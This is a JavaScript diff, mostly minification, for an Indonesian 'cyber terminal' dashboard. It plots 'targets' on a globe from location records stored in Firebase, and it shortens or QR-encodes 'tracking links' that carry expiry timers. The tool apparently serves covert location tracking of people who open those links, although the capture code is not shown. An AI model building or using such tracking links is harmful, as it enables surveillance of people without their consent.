+function initGlobe(){var canvas=document.getElementById('globeCanvas');if(!canvas||typeof THREE==='undefined')return;var box=document.getElementById('globeBox');var W=box.clientWidth,H=box.clientHeight;globeScene=new THREE.Scene();globeCamera=new THREE.PerspectiveCamera(45,W/H,0.1,1000);globeCamera.position.z=2.8;globeRenderer=new THREE.WebGLRenderer({canvas:canvas,alpha:true,antialias:true});globeRenderer.setSize(W,H);globeRenderer.setPixelRatio(Math.min(window.devicePixelRatio,2));globeGroup=new THREE.Group();var loader=new THREE.TextureLoader();loader.crossOrigin='anonymous';var earthMat=new THREE.MeshPhongMaterial({color:0xffffff,transparent:true,opacity:0.95,shininess:8,specular:0x224466});loader.load('https://unpkg.com/three-globe/example/img/earth-blue-marble.jpg',function(t){t.minFilter=THREE.LinearFilter;t.magFilter=THREE.LinearFilter;earthMat.map=t;earthMat.needsUpdate=true},undefined,function(){loader.load('https://unpkg.com/three-globe/example/img/earth-dark.jpg',function(t2){t2.minFilter=THREE.LinearFilter;t2.magFilter=THREE.LinearFilter;earthMat.map=t2;earthMat.needsUpdate=true})});var earthGeo=new THREE.SphereGeometry(1,64,64);globeGroup.add(new THREE.Mesh(earthGeo,earthMat));var wireGeo=new THREE.SphereGeometry(1.006,36,24);var wireMat=new THREE.MeshBasicMaterial({color:0x38bdf8,wireframe:true,transparent:true,opacity:0.10});globeGroup.add(new THREE.Mesh(wireGeo,wireMat));var glowGeo=new THREE.SphereGeometry(1.06,32,32);var glowMat=new THREE.MeshBasicMaterial({color:0x38bdf8,wireframe:true,transparent:true,opacity:0.05});globeGroup.add(new THREE.Mesh(glowGeo,glowMat));globeScene.add(new THREE.AmbientLight(0xffffff,0.8));var dir=new THREE.DirectionalLight(0xffffff,0.9);dir.position.set(5,3,5);globeScene.add(dir);globeScene.add(globeGroup);canvas.addEventListener('mousedown',function(e){globeDragging=true;globePrevX=e.clientX;globePrevY=e.clientY;globeRotating=false;globePaused=true});canvas.addEventListener('mousemove',function(e){if(!globeDragging)return;var dx=e.clientX-globePrevX;var dy=e.clientY-globePrevY;globeGroup.rotation.y+=dx*0.005;globeGroup.rotation.x+=dy*0.005;globePrevX=e.clientX;globePrevY=e.clientY});window.addEventListener('mouseup',function(){globeDragging=false;setTimeout(function(){if(!globeDragging){globeRotating=true;globePaused=false}},1500)});canvas.addEventListener('touchstart',function(e){if(e.touches.length===1){globeDragging=true;globePrevX=e.touches[0].clientX;globePrevY=e.touches[0].clientY;globeRotating=false;globePaused=true}},{passive:true});canvas.addEventListener('touchmove',function(e){if(!globeDragging||e.touches.length!==1)return;var dx=e.touches[0].clientX-globePrevX;var dy=e.touches[0].clientY-globePrevY;globeGroup.rotation.y+=dx*0.005;globeGroup.rotation.x+=dy*0.005;globePrevX=e.touches[0].clientX;globePrevY=e.touches[0].clientY},{passive:true});canvas.addEventListener('touchend',function(){globeDragging=false;setTimeout(function(){if(!globeDragging){globeRotating=true;globePaused=false}},1500)});window.addEventListener('resize',function(){if(!globeRenderer)return;var w=box.clientWidth,h=box.clientHeight;globeCamera.aspect=w/h;globeCamera.updateProjectionMatrix();globeRenderer.setSize(w,h)});animateGlobe()}
+function refreshGlobeMarkers(){if(!globeGroup||typeof THREE==='undefined')return;globeMarkers.forEach(function(m){try{globeGroup.remove(m);if(m.geometry)m.geometry.dispose();if(m.material){if(m.material.map)m.material.map.dispose();m.material.dispose()}}catch(e){}});globeMarkers=[];if(!window.allData)return;var valid=window.allData.filter(function(x){return x[1]&&x[1].lat&&x[1].lng});var cnt=document.getElementById('globeCount');if(cnt)cnt.textContent=valid.length+' target';valid.forEach(function(item,idx){var d=item[1];var lat=parseFloat(d.lat),lng=parseFloat(d.lng);if(!isFinite(lat)||!isFinite(lng))return;var pos=latLngToVector3(lat,lng,1.02);var color=idx%3===0?0xff3355:(idx%3===1?0x00e58a:0x38bdf8);var dotGeo=new THREE.SphereGeometry(0.018,12,12);var dotMat=new THREE.MeshBasicMaterial({color:color});var dot=new THREE.Mesh(dotGeo,dotMat);dot.position.copy(pos);globeGroup.add(dot);globeMarkers.push(dot);var ringGeo=new THREE.RingGeometry(0.022,0.032,24);var ringMat=new THREE.MeshBasicMaterial({color:color,side:THREE.DoubleSide,transparent:true,opacity:0.85});var ring=new THREE.Mesh(ringGeo,ringMat);ring.position.copy(pos);ring.lookAt(0,0,0);globeGroup.add(ring);globeMarkers.push(ring);var lineGeo=new THREE.BufferGeometry().setFromPoints([pos,pos.clone().multiplyScalar(1.08)]);var lineMat=new THREE.LineBasicMaterial({color:color,transparent:true,opacity:0.7});var line=new THREE.Line(lineGeo,lineMat);globeGroup.add(line);globeMarkers.push(line)})}
 var _globeLastFrame=0;
-function animateGlobe(){
-  requestAnimationFrame(animateGlobe);
-  var now=Date.now();
-  if(now-_globeLastFrame<33)return;
-  _globeLastFrame=now;
-  if(globeRotating&&globeGroup&&!globePaused)globeGroup.rotation.y+=0.0018;
-  globeMarkers.forEach(function(m,i){
-    if(m.geometry&&m.geometry.type==='RingGeometry'){
-      var s=1+0.35*Math.sin(now*0.004+i);
-      m.scale.set(s,s,s);
-      m.material.opacity=0.5+0.4*Math.sin(now*0.004+i);
-    }
-  });
-  if(globeRenderer&&globeScene&&globeCamera)globeRenderer.render(globeScene,globeCamera);
-}
+function animateGlobe(){requestAnimationFrame(animateGlobe);var now=Date.now();if(now-_globeLastFrame<33)return;_globeLastFrame=now;if(globeRotating&&globeGroup&&!globePaused)globeGroup.rotation.y+=0.0018;globeMarkers.forEach(function(m,i){if(m.geometry&&m.geometry.type==='RingGeometry'){var s=1+0.35*Math.sin(now*0.004+i);m.scale.set(s,s,s);m.material.opacity=0.5+0.4*Math.sin(now*0.004+i)}});if(globeRenderer&&globeScene&&globeCamera)globeRenderer.render(globeScene,globeCamera)}
 setTimeout(function(){initGlobe();refreshGlobeMarkers()},2000);
 setInterval(refreshGlobeMarkers,5000);
-
-/* ═══ RADAR SERVER MONITOR ═══ */
-const DEFAULT_SERVERS = [
-  { name: 'Google',   url: 'https://www.google.com' },
-  { name: 'GitHub',   url: 'https://github.com' },
-  { name: 'Firebase', url: 'https://firebase.google.com' },
-  { name: 'Cloudflare', url: 'https://www.cloudflare.com' },
-  { name: 'Wikipedia', url: 'https://www.wikipedia.org' },
-  { name: 'OpenAI',   url: 'https://openai.com' }
-];
-let serverList = [];
-try {
-  const saved = localStorage.getItem('serverList_' + (window.user || 'guest'));
-  serverList = saved ? JSON.parse(saved) : DEFAULT_SERVERS.slice();
-} catch(e) {
-  serverList = DEFAULT_SERVERS.slice();
-}
-if (!serverList.length) serverList = DEFAULT_SERVERS.slice();
-let serverStatus = {};
-function saveServerList() {
-  try {
-    localStorage.setItem('serverList_' + (window.user || 'guest'), JSON.stringify(serverList));
-  } catch(e) {}
-}
-function renderServerList() {
-  const el = document.getElementById('serverList');
-  if (!el) return;
-  if (!serverList.length) {
-    el.innerHTML = '<div class="empty" style="padding:12px">Belum ada server</div>';
-    return;
-  }
-  el.innerHTML = serverList.map((s, idx) => {
-    const st = serverStatus[s.url] || { status: 'pending', ping: null };
-    const cls = st.status === 'online' ? 'online' : (st.status === 'slow' ? 'slow' : (st.status === 'offline' ? 'offline' : ''));
-    const pingTxt = st.ping != null ? (st.ping + ' ms') : (st.status === 'offline' ? 'TIMEOUT' : '...');
-    return '<div class="server-item ' + cls + '"><span class="sv-name">' + escapeHtml(s.name) + '</span><span class="sv-ping">' + pingTxt + '</span><button onclick="removeServer(' + idx + ')" style="background:transparent;border:1px solid #24344c;color:#ff3355;font-size:9px;padding:3px 7px;cursor:pointer;border-radius:2px;font-family:inherit">✕</button></div>';
-  }).join('');
-}
-window.addServer = function() {
-  const inp = document.getElementById('newServerInput');
-  const val = inp.value.trim();
-  if (!val) { alert('Isi URL server.'); return; }
-  let url = val;
-  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
-  let name = url.replace(/^https?:\/\//i, '').split('/')[0];
-  if (serverList.some(s => s.url === url)) { alert('Server sudah ada di daftar.'); return; }
-  serverList.push({ name, url });
-  saveServerList();
-  inp.value = '';
-  renderServerList();
-  if (window.addLog) addLog('✔ Server ditambah: ' + name, 'ok');
-  if (window.beep) beep(1800, 0.06);
-  pingServer({ name, url });
-};
-window.removeServer = function(idx) {
-  if (!confirm('Hapus server ini?')) return;
-  const s = serverList[idx];
-  serverList.splice(idx, 1);
-  if (s) delete serverStatus[s.url];
-  saveServerList();
-  renderServerList();
-  refreshRadarBlips();
-  if (window.addLog) addLog('🗑️ Server dihapus: ' + (s ? s.name : '?'), 'warn');
-};
-async function pingServer(server) {
-  const start = Date.now();
-  const timeoutMs = 8000;
-  const controller = new AbortController();
-  const tid = setTimeout(() => controller.abort(), timeoutMs);
-  try {
-    await fetch(server.url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
-    clearTimeout(tid);
-    const ping = Date.now() - start;
-    let status = 'online';
-    if (ping > 1000) status = 'slow';
-    else if (ping > 300) status = 'slow';
-    serverStatus[server.url] = { status, ping, name: server.name };
-  } catch (e) {
-    clearTimeout(tid);
-    serverStatus[server.url] = { status: 'offline', ping: null, name: server.name };
-  }
-}
-async function pingAllServers() {
-  await Promise.all(serverList.map(s => pingServer(s)));
-  renderServerList();
-  refreshRadarBlips();
-  updateRadarStats();
-  const offline = serverList.filter(s => serverStatus[s.url] && serverStatus[s.url].status === 'offline');
-  if (offline.length && window.addLog) {
-    addLog('⚠ ' + offline.length + ' server OFFLINE: ' + offline.map(s=>s.name).join(', '), 'warn');
-  }
-}
-function updateRadarStats() {
-  let online = 0, slow = 0, offline = 0, pingSum = 0, pingCnt = 0;
-  Object.values(serverStatus).forEach(st => {
-    if (st.status === 'online') { online++; if (st.ping != null) { pingSum += st.ping; pingCnt++; } }
-    else if (st.status === 'slow') { slow++; if (st.ping != null) { pingSum += st.ping; pingCnt++; } }
-    else if (st.status === 'offline') { offline++; }
-  });
-  const elOn = document.getElementById('rOnline');
-  const elSl = document.getElementById('rSlow');
-  const elOf = document.getElementById('rOffline');
-  const elPing = document.getElementById('rPing');
-  if (elOn) elOn.textContent = online;
-  if (elSl) elSl.textContent = slow;
-  if (elOf) elOf.textContent = offline;
-  if (elPing) elPing.textContent = pingCnt ? Math.round(pingSum / pingCnt) + ' ms' : '-';
-}
-function refreshRadarBlips() {
-  const container = document.getElementById('radarBlips');
-  if (!container) return;
-  container.innerHTML = '';
-  if (!serverList.length) return;
-  const cx = 50, cy = 50;
-  const radius = 40;
-  serverList.forEach((s, idx) => {
-    const st = serverStatus[s.url];
-    if (!st) return;
-    const angle = (idx / serverList.length) * Math.PI * 2 - Math.PI / 2;
-    const r = radius * (0.5 + 0.5 * ((idx % 3) / 2));
-    const xPct = cx + r * Math.cos(angle);
-    const yPct = cy + r * Math.sin(angle);
-    const cls = st.status === 'online' ? 'online' : (st.status === 'slow' ? 'slow' : 'offline');
-    const blip = document.createElement('div');
-    blip.className = 'radar-blip ' + cls;
-    blip.style.left = xPct + '%';
-    blip.style.top = yPct + '%';
-    blip.style.animationDelay = (idx * 0.2) + 's';
-    blip.title = s.name + ' — ' + (st.ping != null ? st.ping + 'ms' : st.status);
-    container.appendChild(blip);
-    const lbl = document.createElement('div');
-    lbl.className = 'radar-blip-label ' + cls;
-    lbl.style.left = xPct + '%';
-    lbl.style.top = yPct + '%';
-    lbl.textContent = s.name.slice(0, 12);
-    container.appendChild(lbl);
-  });
-}
-setInterval(function() {
-  const scan = document.getElementById('radarScan');
-  if (scan) scan.textContent = Math.floor(Date.now() / 10 % 360) + '°';
-}, 100);
-setTimeout(function() {
-  renderServerList();
-  pingAllServers();
-}, 2000);
-setInterval(pingAllServers, 10000);
-function escapeHtml(s) {
-  return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
-}
-
-/* ═══ CONSOLE LIVE ═══ */
+const DEFAULT_SERVERS=[{name:'Google',url:'https://www.google.com'},{name:'GitHub',url:'https://github.com'},{name:'Firebase',url:'https://firebase.google.com'},{name:'Cloudflare',url:'https://www.cloudflare.com'},{name:'Wikipedia',url:'https://www.wikipedia.org'},{name:'OpenAI',url:'https://openai.com'}];
+let serverList=[];
+try{const saved=localStorage.getItem('serverList_'+(window.user||'guest'));serverList=saved?JSON.parse(saved):DEFAULT_SERVERS.slice()}catch(e){serverList=DEFAULT_SERVERS.slice()}
+if(!serverList.length)serverList=DEFAULT_SERVERS.slice();
+let serverStatus={};
+function saveServerList(){try{localStorage.setItem('serverList_'+(window.user||'guest'),JSON.stringify(serverList))}catch(e){}}
+function renderServerList(){const el=document.getElementById('serverList');if(!el)return;if(!serverList.length){el.innerHTML='<div class="empty" style="padding:12px">Belum ada server</div>';return}el.innerHTML=serverList.map((s,idx)=>{const st=serverStatus[s.url]||{status:'pending',ping:null};const cls=st.status==='online'?'online':(st.status==='slow'?'slow':(st.status==='offline'?'offline':''));const pingTxt=st.ping!=null?(st.ping+' ms'):(st.status==='offline'?'TIMEOUT':'...');return '<div class="server-item '+cls+'"><span class="sv-name">'+escapeHtml(s.name)+'</span><span class="sv-ping">'+pingTxt+'</span><button onclick="removeServer('+idx+')" style="background:transparent;border:1px solid #24344c;color:#ff3355;font-size:9px;padding:3px 7px;cursor:pointer;border-radius:2px;font-family:inherit">✕</button></div>'}).join('')}
+window.addServer=function(){const inp=document.getElementById('newServerInput');const val=inp.value.trim();if(!val){alert('Isi URL server.');return}let url=val;if(!/^https?:\/\//i.test(url))url='https://'+url;let name=url.replace(/^https?:\/\//i,'').split('/')[0];if(serverList.some(s=>s.url===url)){alert('Server sudah ada di daftar.');return}serverList.push({name,url});saveServerList();inp.value='';renderServerList();if(window.addLog)addLog('✔ Server ditambah: '+name,'ok');if(window.beep)beep(1800,0.06);pingServer({name,url})};
+window.removeServer=function(idx){if(!confirm('Hapus server ini?'))return;const s=serverList[idx];serverList.splice(idx,1);if(s)delete serverStatus[s.url];saveServerList();renderServerList();refreshRadarBlips();if(window.addLog)addLog('🗑️ Server dihapus: '+(s?s.name:'?'),'warn')};
+async function pingServer(server){const start=Date.now();const timeoutMs=8000;const controller=new AbortController();const tid=setTimeout(()=>controller.abort(),timeoutMs);try{await fetch(server.url,{mode:'no-cors',cache:'no-store',signal:controller.signal});clearTimeout(tid);const ping=Date.now()-start;let status='online';if(ping>1000)status='slow';else if(ping>300)status='slow';serverStatus[server.url]={status,ping,name:server.name}}catch(e){clearTimeout(tid);serverStatus[server.url]={status:'offline',ping:null,name:server.name}}}
+async function pingAllServers(){await Promise.all(serverList.map(s=>pingServer(s)));renderServerList();refreshRadarBlips();updateRadarStats();const offline=serverList.filter(s=>serverStatus[s.url]&&serverStatus[s.url].status==='offline');if(offline.length&&window.addLog){addLog('⚠ '+offline.length+' server OFFLINE: '+offline.map(s=>s.name).join(', '),'warn')}}
+function updateRadarStats(){let online=0,slow=0,offline=0,pingSum=0,pingCnt=0;Object.values(serverStatus).forEach(st=>{if(st.status==='online'){online++;if(st.ping!=null){pingSum+=st.ping;pingCnt++}}else if(st.status==='slow'){slow++;if(st.ping!=null){pingSum+=st.ping;pingCnt++}}else if(st.status==='offline'){offline++}});const elOn=document.getElementById('rOnline');const elSl=document.getElementById('rSlow');const elOf=document.getElementById('rOffline');const elPing=document.getElementById('rPing');if(elOn)elOn.textContent=online;if(elSl)elSl.textContent=slow;if(elOf)elOf.textContent=offline;if(elPing)elPing.textContent=pingCnt?Math.round(pingSum/pingCnt)+' ms':'-'}
+function refreshRadarBlips(){const container=document.getElementById('radarBlips');if(!container)return;container.innerHTML='';if(!serverList.length)return;const cx=50,cy=50;const radius=40;serverList.forEach((s,idx)=>{const st=serverStatus[s.url];if(!st)return;const angle=(idx/serverList.length)*Math.PI*2-Math.PI/2;const r=radius*(0.5+0.5*((idx%3)/2));const xPct=cx+r*Math.cos(angle);const yPct=cy+r*Math.sin(angle);const cls=st.status==='online'?'online':(st.status==='slow'?'slow':'offline');const blip=document.createElement('div');blip.className='radar-blip '+cls;blip.style.left=xPct+'%';blip.style.top=yPct+'%';blip.style.animationDelay=(idx*0.2)+'s';blip.title=s.name+' — '+(st.ping!=null?st.ping+'ms':st.status);container.appendChild(blip);const lbl=document.createElement('div');lbl.className='radar-blip-label '+cls;lbl.style.left=xPct+'%';lbl.style.top=yPct+'%';lbl.textContent=s.name.slice(0,12);container.appendChild(lbl)})}
+setInterval(function(){const scan=document.getElementById('radarScan');if(scan)scan.textContent=Math.floor(Date.now()/10%360)+'°'},100);
+setTimeout(function(){renderServerList();pingAllServers()},2000);
+setInterval(pingAllServers,10000);
+function escapeHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]))}
 var lcMsgPool=['Encrypted tunnel established','Beacon ping OK','TLS handshake complete','Reverse DNS lookup...','Server ping check...','Uplink signal stable','Session token refreshed','Geo-fence check OK','Battery status ping','Route trace complete','Subroutine execute OK','Firebase connected','Server monitor active'];
 function pushConsoleLine(msg,type){var c=document.getElementById('liveConsole');if(!c)return;var t=new Date().toLocaleTimeString('id-ID');var div=document.createElement('div');div.className='lc-line '+(type||'');div.innerHTML='<span class="lc-time">['+t+']</span>'+msg;c.appendChild(div);while(c.children.length>50)c.removeChild(c.firstChild);c.scrollTop=c.scrollHeight}
 window.pushConsoleLine=pushConsoleLine;
 setInterval(function(){if(Math.random()<0.4){var msg=lcMsgPool[Math.floor(Math.random()*lcMsgPool.length)];var type=Math.random()<0.1?'warn':(Math.random()<0.05?'err':'ok');pushConsoleLine(msg,type)}var ct=document.getElementById('consoleTime');if(ct)ct.textContent=new Date().toLocaleTimeString('id-ID')},2500);
 pushConsoleLine('Firebase connected — /lokasi/'+user,'ok');
 pushConsoleLine('Server monitor initialized','ok');
-
 console.log('%c[CYBER TERMINAL] Loaded — Target mode','color:#00e58a;font-weight:bold');
 </script>
 <script>
@@ -1233,7 +947,6 @@ setTimeout(function(){recordSession()},1500);
 setTimeout(renderSessions,2000);
 </script>
 <script>
-/* UTILITY TOOLS */
 (function(){
   'use strict';
   const U = window.user || localStorage.getItem('username') || 'guest';
@@ -1246,187 +959,43 @@ setTimeout(renderSessions,2000);
       if(pane)pane.classList.add('active');
     });
   });
-  window.qrFromLatest=function(){
-    const last=getLastLink();
-    if(!last){alert('Belum ada link tracking.');return;}
-    document.getElementById('qrInput').value=last;generateQR();
-  };
-  window.generateQR=function(){
-    const url=document.getElementById('qrInput').value.trim();
-    if(!url){alert('Isi link dulu.');return;}
-    const qrUrl='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(url)+'&bgcolor=ffffff&color=000000&margin=10';
-    document.getElementById('qrImg').src=qrUrl;
-    document.getElementById('qrUrl').textContent=url;
-    document.getElementById('qrResult').style.display='flex';
-    if(window.beep)beep(1800,0.08);
-    if(window.addLog)addLog('QR Code generated');
-  };
-  window.downloadQR=function(){
-    const img=document.getElementById('qrImg');
-    if(!img.src)return;
-    fetch(img.src).then(r=>r.blob()).then(b=>{
-      const url=URL.createObjectURL(b);
-      const a=document.createElement('a');a.href=url;a.download='qrcode_'+Date.now()+'.png';a.click();
-      setTimeout(()=>URL.revokeObjectURL(url),2000);
-    }).catch(()=>window.open(img.src,'_blank'));
-  };
-  window.copyQRUrl=function(){
-    const url=document.getElementById('qrInput').value.trim();
-    if(!url)return;
-    navigator.clipboard.writeText(url).then(()=>{clipAdd(url,'QR');if(window.addLog)addLog('Link QR dicopy');});
-  };
-  window.shortFromLatest=function(){
-    const last=getLastLink();
-    if(!last){alert('Belum ada link tracking.');return;}
-    document.getElementById('shortInput').value=last;
-  };
-  window.shortenLink=async function(){
-    const url=document.getElementById('shortInput').value.trim();
-    if(!url){alert('Isi link dulu.');return;}
-    if(!/^https?:\/\//i.test(url)){alert('Link harus mulai dengan http:// atau https://');return;}
-    const res=document.getElementById('shortResult');
-    res.classList.add('show');res.innerHTML='⏳ Memperpendek...';
-    try{
-      const api='https://is.gd/create.php?format=json&url='+encodeURIComponent(url);
-      const r=await fetch(api);const j=await r.json();
-      if(j.shorturl){
-        res.innerHTML='✓ Shortlink:<br><a href="'+j.shorturl+'" target="_blank">'+j.shorturl+'</a><br><br><button class="term-btn outline" style="margin:0;padding:6px 12px;width:auto" onclick="clipAdd(\''+j.shorturl+'\',\'SHORT\')">[ 📋 Simpan ke Clipboard ]</button>';
-        if(window.beep)beep(1800,0.08);if(window.addLog)addLog('Shortlink: '+j.shorturl);
-        if(window.actLog)actLog('🔗 Shortlink dibuat: '+j.shorturl,'link');clipAdd(j.shorturl,'SHORT');
-      } else if(j.errormessage){res.innerHTML='✗ Error: '+j.errormessage;}
-      else{res.innerHTML='✗ Gagal memperpendek.';}
-    }catch(e){res.innerHTML='✗ Error: '+e.message;}
-  };
+  window.qrFromLatest=function(){const last=getLastLink();if(!last){alert('Belum ada link tracking.');return;}document.getElementById('qrInput').value=last;generateQR()};
+  window.generateQR=function(){const url=document.getElementById('qrInput').value.trim();if(!url){alert('Isi link dulu.');return;}const qrUrl='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(url)+'&bgcolor=ffffff&color=000000&margin=10';document.getElementById('qrImg').src=qrUrl;document.getElementById('qrUrl').textContent=url;document.getElementById('qrResult').style.display='flex';if(window.beep)beep(1800,0.08);if(window.addLog)addLog('QR Code generated')};
+  window.downloadQR=function(){const img=document.getElementById('qrImg');if(!img.src)return;fetch(img.src).then(r=>r.blob()).then(b=>{const url=URL.createObjectURL(b);const a=document.createElement('a');a.href=url;a.download='qrcode_'+Date.now()+'.png';a.click();setTimeout(()=>URL.revokeObjectURL(url),2000)}).catch(()=>window.open(img.src,'_blank'))};
+  window.copyQRUrl=function(){const url=document.getElementById('qrInput').value.trim();if(!url)return;navigator.clipboard.writeText(url).then(()=>{clipAdd(url,'QR');if(window.addLog)addLog('Link QR dicopy')})};
+  window.shortFromLatest=function(){const last=getLastLink();if(!last){alert('Belum ada link tracking.');return;}document.getElementById('shortInput').value=last};
+  window.shortenLink=async function(){const url=document.getElementById('shortInput').value.trim();if(!url){alert('Isi link dulu.');return;}if(!/^https?:\/\//i.test(url)){alert('Link harus mulai dengan http:// atau https://');return;}const res=document.getElementById('shortResult');res.classList.add('show');res.innerHTML='⏳ Memperpendek...';try{const api='https://is.gd/create.php?format=json&url='+encodeURIComponent(url);const r=await fetch(api);const j=await r.json();if(j.shorturl){res.innerHTML='✓ Shortlink:<br><a href="'+j.shorturl+'" target="_blank">'+j.shorturl+'</a><br><br><button class="term-btn outline" style="margin:0;padding:6px 12px;width:auto" onclick="clipAdd(\''+j.shorturl+'\',\'SHORT\')">[ 📋 Simpan ke Clipboard ]</button>';if(window.beep)beep(1800,0.08);if(window.addLog)addLog('Shortlink: '+j.shorturl);if(window.actLog)actLog('🔗 Shortlink dibuat: '+j.shorturl,'link');clipAdd(j.shorturl,'SHORT')}else if(j.errormessage){res.innerHTML='✗ Error: '+j.errormessage}else{res.innerHTML='✗ Gagal memperpendek.'}}catch(e){res.innerHTML='✗ Error: '+e.message}};
   let cdInterval=null,cdEndTime=0;
-  window.cdUseLastLink=function(){
-    const last=getLastLink();
-    if(last){document.getElementById('cdLinkInput').value=last;const m=last.match(/[?&]exp=(\d+)/);if(m)document.getElementById('cdMinutes').value=m[1];}
-    else alert('Belum ada link tracking.');
-  };
-  window.startCountdown=function(){
-    const mins=parseInt(document.getElementById('cdMinutes').value)||0;
-    if(mins<=0){alert('Isi durasi expired (menit) > 0.');return;}
-    cdEndTime=Date.now()+mins*60000;
-    const link=document.getElementById('cdLinkInput').value.trim();
-    if(link){try{localStorage.setItem('cdLink_'+U,link);localStorage.setItem('cdEnd_'+U,cdEndTime);}catch(e){}}
-    if(cdInterval)clearInterval(cdInterval);
-    document.getElementById('cdDisplay').classList.remove('expired');
-    document.getElementById('cdLbl').textContent='SISA WAKTU EXPIRED';
-    tickCountdown();cdInterval=setInterval(tickCountdown,1000);
-    if(window.beep)beep(1400,0.08);if(window.addLog)addLog('Countdown dimulai: '+mins+' menit');
-  };
-  function tickCountdown(){
-    const sisa=cdEndTime-Date.now();const el=document.getElementById('cdNum');const disp=document.getElementById('cdDisplay');
-    if(sisa<=0){el.textContent='00:00:00';document.getElementById('cdLbl').textContent='⚠ EXPIRED';disp.classList.add('expired');
-      if(cdInterval){clearInterval(cdInterval);cdInterval=null;}
-      if(window.beep){beep(400,.2);setTimeout(()=>beep(300,.3),250);}
-      if(window.addLog)addLog('⏰ Timer expired!','warn');return;}
-    const h=Math.floor(sisa/3600000),m=Math.floor((sisa%3600000)/60000),s=Math.floor((sisa%60000)/1000);
-    el.textContent=String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
-  }
-  window.stopCountdown=function(){if(cdInterval){clearInterval(cdInterval);cdInterval=null;}document.getElementById('cdLbl').textContent='DIHENTIKAN';};
-  window.resetCountdown=function(){if(cdInterval){clearInterval(cdInterval);cdInterval=null;}cdEndTime=0;document.getElementById('cdNum').textContent='--:--:--';document.getElementById('cdLbl').textContent='BELUM DIMULAI';document.getElementById('cdDisplay').classList.remove('expired');};
-  setTimeout(()=>{try{const end=parseInt(localStorage.getItem('cdEnd_'+U)||'0');const link=localStorage.getItem('cdLink_'+U)||'';if(end&&end>Date.now()){cdEndTime=end;document.getElementById('cdLinkInput').value=link;document.getElementById('cdDisplay').classList.remove('expired');document.getElementById('cdLbl').textContent='SISA WAKTU EXPIRED';tickCountdown();cdInterval=setInterval(tickCountdown,1000);}}catch(e){}},500);
+  window.cdUseLastLink=function(){const last=getLastLink();if(last){document.getElementById('cdLinkInput').value=last;const m=last.match(/[?&]exp=(\d+)/);if(m)document.getElementById('cdMinutes').value=m[1]}else alert('Belum ada link tracking.')};
+  window.startCountdown=function(){const mins=parseInt(document.getElementById('cdMinutes').value)||0;if(mins<=0){alert('Isi durasi expired (menit) > 0.');return}cdEndTime=Date.now()+mins*60000;const link=document.getElementById('cdLinkInput').value.trim();if(link){try{localStorage.setItem('cdLink_'+U,link);localStorage.setItem('cdEnd_'+U,cdEndTime)}catch(e){}}if(cdInterval)clearInterval(cdInterval);document.getElementById('cdDisplay').classList.remove('expired');document.getElementById('cdLbl').textContent='SISA WAKTU EXPIRED';tickCountdown();cdInterval=setInterval(tickCountdown,1000);if(window.beep)beep(1400,0.08);if(window.addLog)addLog('Countdown dimulai: '+mins+' menit')};
+  function tickCountdown(){const sisa=cdEndTime-Date.now();const el=document.getElementById('cdNum');const disp=document.getElementById('cdDisplay');if(sisa<=0){el.textContent='00:00:00';document.getElementById('cdLbl').textContent='⚠ EXPIRED';disp.classList.add('expired');if(cdInterval){clearInterval(cdInterval);cdInterval=null}if(window.beep){beep(400,.2);setTimeout(()=>beep(300,.3),250)}if(window.addLog)addLog('⏰ Timer expired!','warn');return}const h=Math.floor(sisa/3600000),m=Math.floor((sisa%3600000)/60000),s=Math.floor((sisa%60000)/1000);el.textContent=String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')}
+  window.stopCountdown=function(){if(cdInterval){clearInterval(cdInterval);cdInterval=null}document.getElementById('cdLbl').textContent='DIHENTIKAN'};
+  window.resetCountdown=function(){if(cdInterval){clearInterval(cdInterval);cdInterval=null}cdEndTime=0;document.getElementById('cdNum').textContent='--:--:--';document.getElementById('cdLbl').textContent='BELUM DIMULAI';document.getElementById('cdDisplay').classList.remove('expired')};
+  setTimeout(()=>{try{const end=parseInt(localStorage.getItem('cdEnd_'+U)||'0');const link=localStorage.getItem('cdLink_'+U)||'';if(end&&end>Date.now()){cdEndTime=end;document.getElementById('cdLinkInput').value=link;document.getElementById('cdDisplay').classList.remove('expired');document.getElementById('cdLbl').textContent='SISA WAKTU EXPIRED';tickCountdown();cdInterval=setInterval(tickCountdown,1000)}}catch(e){}},500);
   function clipLoad(){try{return JSON.parse(localStorage.getItem('clipHist_'+U)||'[]')}catch(e){return[]}}
   function clipSave(arr){try{localStorage.setItem('clipHist_'+U,JSON.stringify(arr.slice(0,30)))}catch(e){}}
-  window.clipAdd=function(txt,tag){
-    const v=txt||(document.getElementById('clipManualInput').value.trim());if(!v)return;
-    const arr=clipLoad();const filtered=arr.filter(x=>x.txt!==v);
-    filtered.unshift({txt:v,tag:tag||'MANUAL',waktu:Date.now()});clipSave(filtered);
-    const inp=document.getElementById('clipManualInput');if(inp)inp.value='';renderClipboard();
-  };
-  window.clipDel=function(idx){const arr=clipLoad();arr.splice(idx,1);clipSave(arr);renderClipboard();};
-  window.clipCopy=function(idx){const arr=clipLoad();if(!arr[idx])return;navigator.clipboard.writeText(arr[idx].txt).then(()=>{if(window.beep)beep(1800,0.06);if(window.addLog)addLog('Link dicopy dari history');});};
-  window.clipClear=function(){if(!confirm('Hapus semua riwayat clipboard?'))return;try{localStorage.removeItem('clipHist_'+U)}catch(e){}renderClipboard();};
-  function renderClipboard(){
-    const el=document.getElementById('clipList');if(!el)return;const arr=clipLoad();
-    if(!arr.length){el.innerHTML='<div class="empty">Belum ada riwayat</div>';return;}
-    el.innerHTML=arr.map((item,idx)=>{
-      const tgl=new Date(item.waktu).toLocaleString('id-ID');
-      const tag=item.tag?'<span style="color:var(--gold);font-size:8px">['+item.tag+']</span> ':'';
-      return '<div class="clip-item"><div style="flex:1"><div class="clip-txt">'+tag+escapeHtml(item.txt)+'</div><div class="clip-meta">'+tgl+'</div></div><div class="clip-btns"><button onclick="clipCopy('+idx+')">COPY</button><button class="del" onclick="clipDel('+idx+')">DEL</button></div></div>';
-    }).join('');
-  }
